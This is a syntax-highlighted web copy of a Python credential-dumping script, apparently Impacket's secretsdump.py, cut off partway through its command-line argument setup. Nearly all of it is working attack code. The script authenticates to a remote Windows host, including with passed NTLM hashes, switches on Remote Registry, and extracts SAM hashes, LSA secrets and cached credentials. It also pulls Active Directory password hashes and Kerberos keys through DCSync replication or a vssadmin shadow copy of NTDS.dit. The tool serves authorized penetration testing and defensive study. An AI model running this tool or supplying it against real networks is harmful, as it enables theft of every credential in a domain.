class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This software is provided under a slightly modified version</span><br><span class="hljs-comment"># of the Apache Software License. See the accompanying LICENSE file</span><br><span class="hljs-comment"># for more information.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Description: Performs various techniques to dump hashes from the</span><br><span class="hljs-comment">#              remote machine without executing any agent there.</span><br><span class="hljs-comment">#              For SAM and LSA Secrets (including cached creds)</span><br><span class="hljs-comment">#              we try to read as much as we can from the registry</span><br><span class="hljs-comment">#              and then we save the hives in the target system</span><br><span class="hljs-comment">#              (%SYSTEMROOT%\\Temp dir) and read the rest of the</span><br><span class="hljs-comment">#              data from there.</span><br><span class="hljs-comment">#              For NTDS.dit we either:</span><br><span class="hljs-comment">#                a. Get the domain users list and get its hashes</span><br><span class="hljs-comment">#                   and Kerberos keys using [MS-DRDS] DRSGetNCChanges()</span><br><span class="hljs-comment">#                   call, replicating just the attributes we need.</span><br><span class="hljs-comment">#                b. Extract NTDS.dit via vssadmin executed  with the</span><br><span class="hljs-comment">#                   smbexec approach.</span><br><span class="hljs-comment">#                   It&#x27;s copied on the temp dir and parsed remotely.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#              The script initiates the services required for its working</span><br><span class="hljs-comment">#              if they are not available (e.g. Remote Registry, even if it is</span><br><span class="hljs-comment">#              disabled). After the work is done, things are restored to the</span><br><span class="hljs-comment">#              original state.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author:</span><br><span class="hljs-comment">#  Alberto Solino (@agsolino)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># References: Most of the work done by these guys. I just put all</span><br><span class="hljs-comment">#             the pieces together, plus some extra magic.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://github.com/gentilkiwi/kekeo/tree/master/dcsync</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html</span><br><span class="hljs-comment"># https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13</span><br><span class="hljs-comment"># https://code.google.com/p/creddump/</span><br><span class="hljs-comment"># https://lab.mediaservice.net/code/cachedump.rb</span><br><span class="hljs-comment"># https://insecurety.net/?p=768</span><br><span class="hljs-comment"># http://www.beginningtoseethelight.org/ntsecurity/index.htm</span><br><span class="hljs-comment"># https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&amp;-forensic-analysis.pdf</span><br><span class="hljs-comment"># https://www.passcape.com/index.php?section=blog&amp;cmd=details&amp;id=15</span><br><span class="hljs-comment">#</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> division<br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">from</span> impacket <span class="hljs-keyword">import</span> version<br><span class="hljs-keyword">from</span> impacket.examples <span class="hljs-keyword">import</span> logger<br><span class="hljs-keyword">from</span> impacket.examples.utils <span class="hljs-keyword">import</span> parse_target<br><span class="hljs-keyword">from</span> impacket.smbconnection <span class="hljs-keyword">import</span> SMBConnection<br><br><span class="hljs-keyword">from</span> impacket.examples.secretsdump <span class="hljs-keyword">import</span> (<br>    LocalOperations,<br>    RemoteOperations,<br>    SAMHashes,<br>    LSASecrets,<br>    NTDSHashes,<br>)<br><span class="hljs-keyword">from</span> impacket.krb5.keytab <span class="hljs-keyword">import</span> Keytab<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">input</span> = raw_input<br><span class="hljs-keyword">except</span> NameError:<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DumpSecrets</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, remoteName, username=<span class="hljs-string">&quot;&quot;</span>, password=<span class="hljs-string">&quot;&quot;</span>, domain=<span class="hljs-string">&quot;&quot;</span>, options=<span class="hljs-literal">None</span></span>):<br>        self.__useVSSMethod = options.use_vss<br>        self.__remoteName = remoteName<br>        self.__remoteHost = options.target_ip<br>        self.__username = username<br>        self.__password = password<br>        self.__domain = domain<br>        self.__lmhash = <span class="hljs-string">&quot;&quot;</span><br>        self.__nthash = <span class="hljs-string">&quot;&quot;</span><br>        self.__aesKey = options.aesKey<br>        self.__smbConnection = <span class="hljs-literal">None</span><br>        self.__remoteOps = <span class="hljs-literal">None</span><br>        self.__SAMHashes = <span class="hljs-literal">None</span><br>        self.__NTDSHashes = <span class="hljs-literal">None</span><br>        self.__LSASecrets = <span class="hljs-literal">None</span><br>        self.__systemHive = options.system<br>        self.__bootkey = options.bootkey<br>        self.__securityHive = options.security<br>        self.__samHive = options.sam<br>        self.__ntdsFile = options.ntds<br>        self.__history = options.history<br>        self.__noLMHash = <span class="hljs-literal">True</span><br>        self.__isRemote = <span class="hljs-literal">True</span><br>        self.__outputFileName = options.outputfile<br>        self.__doKerberos = options.k<br>        self.__justDC = options.just_dc<br>        self.__justDCNTLM = options.just_dc_ntlm<br>        self.__justUser = options.just_dc_user<br>        self.__pwdLastSet = options.pwd_last_set<br>        self.__printUserStatus = options.user_status<br>        self.__resumeFileName = options.resumefile<br>        self.__canProcessSAMLSA = <span class="hljs-literal">True</span><br>        self.__kdcHost = options.dc_ip<br>        self.__options = options<br><br>        <span class="hljs-keyword">if</span> options.hashes <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self.__lmhash, self.__nthash = options.hashes.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">self</span>):<br>        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)<br>        <span class="hljs-keyword">if</span> self.__doKerberos:<br>            self.__smbConnection.kerberosLogin(<br>                self.__username,<br>                self.__password,<br>                self.__domain,<br>                self.__lmhash,<br>                self.__nthash,<br>                self.__aesKey,<br>                self.__kdcHost,<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            self.__smbConnection.login(<br>                self.__username,<br>                self.__password,<br>                self.__domain,<br>                self.__lmhash,<br>                self.__nthash,<br>            )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.__remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> self.__username == <span class="hljs-string">&quot;&quot;</span>:<br>                self.__isRemote = <span class="hljs-literal">False</span><br>                self.__useVSSMethod = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">if</span> self.__systemHive:<br>                    localOperations = LocalOperations(self.__systemHive)<br>                    bootKey = localOperations.getBootKey()<br>                    <span class="hljs-keyword">if</span> self.__ntdsFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        <span class="hljs-comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span><br>                        self.__noLMHash = localOperations.checkNoLMHashPolicy()<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">import</span> binascii<br><br>                    bootKey = binascii.unhexlify(self.__bootkey)<br><br>            <span class="hljs-keyword">else</span>:<br>                self.__isRemote = <span class="hljs-literal">True</span><br>                bootKey = <span class="hljs-literal">None</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        self.connect()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-keyword">if</span> (<br>                            os.getenv(<span class="hljs-string">&quot;KRB5CCNAME&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>                            <span class="hljs-keyword">and</span> self.__doKerberos <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                        ):<br>                            <span class="hljs-comment"># SMBConnection failed. That might be because there was no way to log into the</span><br>                            <span class="hljs-comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span><br>                            <span class="hljs-comment"># will work</span><br>                            logging.debug(<br>                                <span class="hljs-string">&quot;SMBConnection didn&#x27;t work, hoping Kerberos will help (%s)&quot;</span><br>                                % <span class="hljs-built_in">str</span>(e)<br>                            )<br>                            <span class="hljs-keyword">pass</span><br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">raise</span><br><br>                    self.__remoteOps = RemoteOperations(<br>                        self.__smbConnection, self.__doKerberos, self.__kdcHost<br>                    )<br>                    self.__remoteOps.setExecMethod(self.__options.exec_method)<br>                    <span class="hljs-keyword">if</span> (<br>                        self.__justDC <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                        <span class="hljs-keyword">and</span> self.__justDCNTLM <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                        <span class="hljs-keyword">or</span> self.__useVSSMethod <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                    ):<br>                        self.__remoteOps.enableRegistry()<br>                        bootKey = self.__remoteOps.getBootKey()<br>                        <span class="hljs-comment"># Let&#x27;s check whether target system stores LM Hashes</span><br>                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    self.__canProcessSAMLSA = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">if</span> (<br>                        <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;STATUS_USER_SESSION_DELETED&quot;</span>)<br>                        <span class="hljs-keyword">and</span> os.getenv(<span class="hljs-string">&quot;KRB5CCNAME&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>                        <span class="hljs-keyword">and</span> self.__doKerberos <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                    ):<br>                        <span class="hljs-comment"># Giving some hints here when SPN target name validation is set to something different to Off</span><br>                        <span class="hljs-comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span><br>                        logging.error(<br>                            <span class="hljs-string">&quot;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&quot;</span><br>                        )<br>                    <span class="hljs-keyword">else</span>:<br>                        logging.error(<span class="hljs-string">&quot;RemoteOperations failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>            <span class="hljs-comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span><br>            <span class="hljs-keyword">if</span> (<br>                self.__justDC <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">and</span> self.__justDCNTLM <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">and</span> self.__canProcessSAMLSA<br>            ):<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                        SAMFileName = self.__remoteOps.saveSAM()<br>                    <span class="hljs-keyword">else</span>:<br>                        SAMFileName = self.__samHive<br><br>                    self.__SAMHashes = SAMHashes(<br>                        SAMFileName, bootKey, isRemote=self.__isRemote<br>                    )<br>                    self.__SAMHashes.dump()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__SAMHashes.export(self.__outputFileName)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    logging.error(<span class="hljs-string">&quot;SAM hashes extraction failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                        SECURITYFileName = self.__remoteOps.saveSECURITY()<br>                    <span class="hljs-keyword">else</span>:<br>                        SECURITYFileName = self.__securityHive<br><br>                    self.__LSASecrets = LSASecrets(<br>                        SECURITYFileName,<br>                        bootKey,<br>                        self.__remoteOps,<br>                        isRemote=self.__isRemote,<br>                        history=self.__history,<br>                    )<br>                    self.__LSASecrets.dumpCachedHashes()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__LSASecrets.exportCached(self.__outputFileName)<br>                    self.__LSASecrets.dumpSecrets()<br>                    <span class="hljs-keyword">if</span> self.__outputFileName <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        self.__LSASecrets.exportSecrets(self.__outputFileName)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                        <span class="hljs-keyword">import</span> traceback<br><br>                        traceback.print_exc()<br>                    logging.error(<span class="hljs-string">&quot;LSA hashes extraction failed: %s&quot;</span> % <span class="hljs-built_in">str</span>(e))<br><br>            <span class="hljs-comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span><br>            <span class="hljs-keyword">if</span> self.__isRemote <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>                <span class="hljs-keyword">if</span> self.__useVSSMethod <span class="hljs-keyword">and</span> self.__remoteOps <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    NTDSFileName = self.__remoteOps.saveNTDS()<br>                <span class="hljs-keyword">else</span>:<br>                    NTDSFileName = <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">else</span>:<br>                NTDSFileName = self.__ntdsFile<br><br>            self.__NTDSHashes = NTDSHashes(<br>                NTDSFileName,<br>                bootKey,<br>                isRemote=self.__isRemote,<br>                history=self.__history,<br>                noLMHash=self.__noLMHash,<br>                remoteOps=self.__remoteOps,<br>                useVSSMethod=self.__useVSSMethod,<br>                justNTLM=self.__justDCNTLM,<br>                pwdLastSet=self.__pwdLastSet,<br>                resumeSession=self.__resumeFileName,<br>                outputFileName=self.__outputFileName,<br>                justUser=self.__justUser,<br>                printUserStatus=self.__printUserStatus,<br>            )<br>            <span class="hljs-keyword">try</span>:<br>                self.__NTDSHashes.dump()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                    <span class="hljs-keyword">import</span> traceback<br><br>                    traceback.print_exc()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;ERROR_DS_DRA_BAD_DN&quot;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span><br>                    <span class="hljs-comment"># of enough privileges to access DRSUAPI.</span><br>                    resumeFile = self.__NTDSHashes.getResumeSessionFile()<br>                    <span class="hljs-keyword">if</span> resumeFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        os.unlink(resumeFile)<br>                logging.error(e)<br>                <span class="hljs-keyword">if</span> (<br>                    self.__justUser<br>                    <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;= <span class="hljs-number">0</span><br>                ):<br>                    logging.info(<br>                        <span class="hljs-string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span><br>                        <span class="hljs-string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span><br>                        <span class="hljs-string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span><br>                    )<br>                <span class="hljs-keyword">elif</span> self.__useVSSMethod <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>                    logging.info(<br>                        <span class="hljs-string">&quot;Something wen&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&quot;</span><br>                    )<br>            self.cleanup()<br>        <span class="hljs-keyword">except</span> (Exception, KeyboardInterrupt) <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">if</span> logging.getLogger().level == logging.DEBUG:<br>                <span class="hljs-keyword">import</span> traceback<br><br>                traceback.print_exc()<br>            logging.error(e)<br>            <span class="hljs-keyword">if</span> self.__NTDSHashes <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(e, KeyboardInterrupt):<br>                    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                        answer = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Delete resume session file? [y/N] &quot;</span>)<br>                        <span class="hljs-keyword">if</span> answer.upper() == <span class="hljs-string">&quot;&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;N&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&quot;Y&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;Y&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> answer.upper() == <span class="hljs-string">&quot;N&quot;</span>:<br>                            answer = <span class="hljs-string">&quot;N&quot;</span><br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> answer == <span class="hljs-string">&quot;Y&quot;</span>:<br>                        resumeFile = self.__NTDSHashes.getResumeSessionFile()<br>                        <span class="hljs-keyword">if</span> resumeFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                            os.unlink(resumeFile)<br>            <span class="hljs-keyword">try</span>:<br>                self.cleanup()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):<br>        logging.info(<span class="hljs-string">&quot;Cleaning up... &quot;</span>)<br>        <span class="hljs-keyword">if</span> self.__remoteOps:<br>            self.__remoteOps.finish()<br>        <span class="hljs-keyword">if</span> self.__SAMHashes:<br>            self.__SAMHashes.finish()<br>        <span class="hljs-keyword">if</span> self.__LSASecrets:<br>            self.__LSASecrets.finish()<br>        <span class="hljs-keyword">if</span> self.__NTDSHashes:<br>            self.__NTDSHashes.finish()<br><br><br><span class="hljs-comment"># Process command-line arguments.</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Explicitly changing the stdout encoding format</span><br>    <span class="hljs-keyword">if</span> sys.stdout.encoding <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># Output is redirected to a file</span><br>        sys.stdout = codecs.getwriter(<span class="hljs-string">&quot;utf8&quot;</span>)(sys.stdout)<br><br>    <span class="hljs-built_in">print</span>(version.BANNER)<br><br>    parser = argparse.ArgumentParser(<br>        add_help=<span class="hljs-literal">True</span>,<br>        description=<span class="hljs-string">&quot;Performs various techniques to dump secrets from &quot;</span><br>        <span class="hljs-string">&quot;the remote machine without executing any agent there.&quot;</span>,<br>    )<br><br>    parser.add_argument(<br>        <span class="hljs-string">&quot;target&quot;</span>,<br>        action=<span class="hljs-string">&quot;store&quot;</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&quot;</span><br>        <span class="hljs-string">&quot; (if you want to parse local files)&quot;</span>,<br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-ts&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Adds timestamp to every logging output&quot;</span><br>    )<br>    parser.add_argument(<span class="hljs-string">&quot;-debug&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Turn DEBUG output ON&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-system&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;SYSTEM hive to parse&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-bootkey&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;bootkey for SYSTEM hive&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-security&quot;</span>, action=<span class="hljs-string">&quot;store&quot;</span>, <span 